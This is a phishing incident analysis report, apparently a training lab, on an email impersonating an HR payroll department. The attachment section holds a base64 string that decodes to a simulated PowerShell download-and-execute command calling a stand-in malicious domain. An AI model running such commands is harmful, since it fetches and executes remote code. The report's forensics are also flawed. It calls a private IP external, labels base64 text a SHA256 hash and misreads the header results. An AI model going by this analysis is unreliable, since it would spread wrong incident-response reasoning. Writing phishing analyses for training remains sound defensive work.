PHISHING INCIDENT ANALYSIS REPORT

1. INCIDENT OVERVIEW
   Incident ID: 003
   Date Detected: 2026-04-06
   Analyst: Hasan
   Severity: High
   Category: Phishing

2. EMAIL SUMMARY
   Subject: Updated Payroll Information - Action Required
   Sender Display Name: HR Department
   Sender Email:hr@company-payroll.com
   Recipient: Employee employee@gmail.com
   Date Received: Tue, 31 Mar 2026 17:22:00
   Message ID: 9988XYZ@mail.company-payroll.com

3. EXECUTIVE SUMMARY
   This report analyzes a suspicious email identified as a phishing attempt impersonating HR rep at the company.
   The email attempts to deceive employees to click a file to update their payroll information by providing private information. 

4. TECHNICAL ANALYSIS

4.1 Header Authentication Results
SPF: Failed
DKIM: None
DMARC: Failed

Analysis:
SPF / DKIM / DMARC all failed and is a clear indicator that this user isa not authorized to send emails on behalf of the used domain name. 

4.2 Email Routing (Received Chain)
Originating IP: 203.0.113.55
Relay IP(s): 192.168.1.10

Analysis:
The email originated from a different IP then it's returning IP address. 
This is a clear indication of phishing and possible credential harvesting
because the email is focused on obtaining employees updated payroll infomation. 
The external IP is only there to collect information when the user replys back to the malicious email.

4.3 Domain Analysis
Sender Domain: company-Payroll.com
Observed Technique (if any): domain indicates "company payroll" while at the same same time giving urgency to the user to click the file before realizing the domain is external from the company.

Analysis:
the domain is crafted with the word "payroll" to create urgent reactions from users/employees, a common phishing technique to evade user detections

4.4 URL Analysis
Malicious URL(s): no malicious URL, but there is a malicious file link: Payroll_Update.doc

Analysis:
The email objective is have the employee click the malicious the link to update their payroll information, but instead the updated info will be redirected to an external IP(192.168.1.10)

4.5 Attachment Analysis (if applicable)
File Name: Payroll_Update.doc
File Type: application/octet-stream
Hash (SHA256): VGhpcyBpcyBhIHNpbXVsYXRlZCBtYWxpY2lvdXMgZmlsZSBmb3IgbGFicy
4gUG93ZXJTaGVsbCBjb21tYW5kOiBwb3dlcnNoZWxsIC1jb21tYW5kICJJRVg
gKG5ldC53ZWIuY2xpZW50KS5Eb3dubG9hZFN0cmluZygn
aHR0cDovL21hbGljaW91cy1kb21haW4uY29tL3BheWxvYWQnKSI
Base64 extraction: This is a simulated malicious file for labs. 
PowerShell command: powershell -command "IEX (net.web.client).DownloadString

Analysis:
The email file aims to get user to click and download a malicious file to harvest important user information while user is unaware of the process.

5. INDICATORS OF COMPROMISE (IOCs)

Indicator Type: Failed Header Authentication 
Value: SPF / DKIM / DMARC = all Fail

Indicator Type: Both IP addresses
Value: 203.0.113.55 (originating) / 192.168.1.10 (replying)

Indicator Type: Malicious sender Domain
Value: hr@company-payroll.com

Indicator Type:
Value:

6. THREAT ASSESSMENT
   Threat Type: Phishing (Credential Harvesting using a updated info file)
   Confidence Level: High

## Potential Impact:

* Financial Fruad 
* Data Compromise

7. BEHAVIORAL ANALYSIS

* Urgency: impersonating HR payroll department
* Deceptive Domain structure: company-payroll.com
* internal IP & external IP does not match: redirects users to malicious activity, possible credential harvesting

8. CONCLUSION
   Based on the finding and analization this email is confirmed as a phishing attempt. 
   The threat actor aim is to harvest user credentials through impersomnation of HR reps 
   to try to get the user to give valuable information about themselves. 

9. RECOMMENDATIONS

* Block associated domains and IP at network level
* Add IOCs to SIEM
* Conduct user awareness training 
* Monitor for similar phishing attempts


